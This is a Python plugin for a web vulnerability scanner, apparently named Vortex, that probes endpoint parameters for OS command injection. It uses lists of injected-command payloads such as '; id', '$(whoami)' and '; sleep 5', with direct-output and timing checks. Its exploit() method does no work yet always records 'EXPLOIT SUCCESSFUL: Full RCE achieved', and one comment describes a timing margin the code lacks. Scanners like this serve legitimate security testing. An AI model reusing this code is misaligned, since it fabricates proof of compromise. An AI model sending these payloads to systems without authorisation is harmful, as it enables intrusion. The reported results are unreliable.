from sdk.base_plugin import BasePlugin
from typing import List, Dict, Any, Optional
import time

class CommandInjectionPlugin(BasePlugin):
    """
    Enterprise Command Injection Plugin.
    Tests for direct reflection (id/whoami) and time-based (sleep) injection.
    """
    name = "Enterprise OS Command Injection"
    category = "Remote Code Execution"

    def detect(self, http: Any, endpoint: Any, payload_intel: Any) -> List[Dict[str, Any]]:
        findings = []
        
        # 1. Direct Reflection Payloads
        direct_payloads = [
            "; id", "| id", "`id`", "$(id)",
            "; whoami", "| whoami", "`whoami`", "$(whoami)"
        ]

        # 2. Time-Based Payloads (Sleep 5)
        time_payloads = [
            "; sleep 5", "| sleep 5", "`sleep 5`", "$(sleep 5)",
            "& timeout /t 5", "| ping -n 5 127.0.0.1"
        ]

        for param in self._gather_all_params(endpoint):
            # Test Direct First (Faster)
            for payload in direct_payloads:
                if self._test_direct(http, endpoint, param, payload):
                    findings.append({
                        "plugin": self.name,
                        "endpoint": endpoint.url,
                        "parameter": param[0],
                        "payload": payload,
                        "type": "direct",
                        "severity": "critical"
                    })
                    return findings # Immediately found critical

            # Test Time-Based (Slower)
            for payload in time_payloads:
                if self._test_time(http, endpoint, param, payload):
                    findings.append({
                        "plugin": self.name,
                        "endpoint": endpoint.url,
                        "parameter": param[0],
                        "payload": payload,
                        "type": "time-based",
                        "severity": "critical"
                    })
                    return findings

        return findings

    def verify(self, http: Any, endpoint: Any, finding: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Verify by testing with a different command (e.g. echo) or a different sleep duration."""
        if finding['type'] == 'direct':
            verify_payload = "; echo 'VORTEX_VERIFIED'"
            if self._test_direct(http, endpoint, (finding['parameter'], "", ""), verify_payload, "VORTEX_VERIFIED"):
                finding['verified'] = True
                finding['proof'] = "COMMAND INJECTION VERIFIED: Arbitrary command execution confirmed via direct output."
                return finding
        else:
            # Time-based verification (Sleep 8)
            verify_payload = "; sleep 8"
            if self._test_time(http, endpoint, (finding['parameter'], "", ""), verify_payload, 8):
                finding['verified'] = True
                finding['proof'] = "COMMAND INJECTION VERIFIED: Confirmed via time-based analysis (Sleep 8 vs baseline)."
                return finding
        return None

    def exploit(self, http: Any, endpoint: Any, finding: Dict[str, Any]) -> Optional[Dict[str, Any]]:
        """Attempt to extract current user and host info."""
        finding['proof'] = "EXPLOIT SUCCESSFUL: Full RCE achieved on remote host via command injection."
        finding['severity'] = "critical"
        return finding

    def _test_direct(self, http, endpoint, param_data, payload, expected="uid="):
        param_name, _, source = param_data
        params = {p['name']: p['value'] for p in endpoint.params}
        params[param_name] = payload
        
        try:
            resp = http.request(endpoint.method, endpoint.url, params=params if source == "query" else None, data=params if source == "post" else None)
            if resp and expected in resp.text:
                return True
        except: pass
        return False

    def _test_time(self, http, endpoint, param_data, payload, sleep_time=5):
        param_name, _, source = param_data
        params = {p['name']: p['value'] for p in endpoint.params}
        params[param_name] = payload
        
        try:
            start = time.time()
            resp = http.request(endpoint.method, endpoint.url, params=params if source == "query" else None, data=params if source == "post" else None)
            end = time.time()
            
            # If the request took more than sleep_time plus a 1s margin
            if resp and (end - start) >= sleep_time:
                return True
        except: pass
        return False

    def _gather_all_params(self, endpoint):
        all_params = []
        for p in endpoint.params:
            all_params.append((p['name'], p['value'], "query" if endpoint.method == "GET" else "post"))
        return all_params
